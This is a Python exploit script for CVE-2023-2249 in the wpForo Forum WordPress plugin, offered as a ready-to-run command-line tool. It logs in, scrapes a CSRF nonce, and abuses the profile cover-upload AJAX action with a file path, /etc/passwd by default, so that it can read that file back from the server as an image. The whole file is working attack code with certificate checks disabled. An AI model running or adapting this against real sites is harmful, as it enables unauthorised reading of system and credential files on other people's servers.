import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urljoin
from rich import print as pprint
import warnings
from requests.packages.urllib3.exceptions import DependencyWarning
import pdb
warnings.filterwarnings("ignore")


warnings.filterwarnings("ignore", category=DependencyWarning)

def parser():
    parser = argparse.ArgumentParser(description='Exploit for CVE-2023-2249 in wpForo Forum plugin for WordPress.')
    parser.add_argument('-i', '--ip', required=True,  help = "Host", type=str)
    parser.add_argument('-p', '--port', required=True, help = "Port", type=str)
    parser.add_argument('-l', '--location', help = 'Wordpress Site Base URL', default="", type=str)
    parser.add_argument('-u', '--user', required=True, action='store', type=str, help='Username')
    parser.add_argument('-q', '--password', required=True, action='store', type=str, help='Password')
    parser.add_argument('-f', '--file', action='store',default="/etc/passwd", type=str, help='file path to be fetched/home/ayansaha/personal_github/CVE-2023-2249/script.py')
    args = parser.parse_args()
    return args




def exploit(host,port,sitelocation,user,password,file):
    pprint("[cyan][*] Logging in [/cyan]")
    base_url = urljoin(f"{host}:{port}",sitelocation)

    login_url = urljoin(base_url, 'sign-in')

    # Start a session so we can have persistent cookies
    session = requests.session()
    session.verify = False
    session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0'})

    # This is the form data that the page sends when logging in
    login_data = {
        'log': user,
        'pwd': password, # hide password input
        'wpforologin': 'Sign+In',
        'wpfaction': 'login',
    }

    # Get the base page to retrieve the CSRF token
    r = session.get(login_url)


    # Use BeautifulSoup to find the CSRF token in the HTML
    soup = BeautifulSoup(r.text, 'html.parser')

    _wpfnonce = soup.find('input', attrs={'name': '_wpfnonce'})['value']
    login_data['_wpfnonce'] = _wpfnonce

    session.headers.update({'Referer': login_url})
    # Send a POST request with the form data
    r = session.post(login_url, data=login_data, allow_redirects=False)

    # Check if login was successful
    if r.status_code == 302 and 'wordpress_logged_in' in r.headers['Set-Cookie']:
        pprint("[green][+] Logged in [/green]")
    else:
        pprint("[red][-] Couldn't log in [/red]")
        exit(1)



    pprint("[cyan][+] Injecting payload[/cyan]")
    exploit = {
        'referer': f"{host}:{port}",
        'image_blob': file,
        'action': 'wpforo_profiles_default_cover_upload',
        '_wpfnonce': _wpfnonce,
    }


    r = session.post(urljoin(base_url,"/wp-admin/admin-ajax.php"), data=exploit)

    if r.status_code == 200 and 'true' in r.text:
        pprint("[green][+] Injected payload successfully[/green]")
    else:
        pprint("[red][-] Exploit Failed [/red]")
        exit(1)

    r = requests.get(urljoin(base_url,"/wp-content/uploads/wpforo/covers/profiles_custom_default_cover.jpg"), verify=False)

    if r.status_code == 200:
        pprint(f"[green][+] Printing contents of {file}[/green]\n\n")
        print(r.text)
    else:
        pprint(f"[red][-] Couldn't fetch file contents[/red]")
        exit(1)


if __name__=="__main__":
    args = parser()
    exploit(args.ip,args.port,args.location,args.user,args.password,args.file)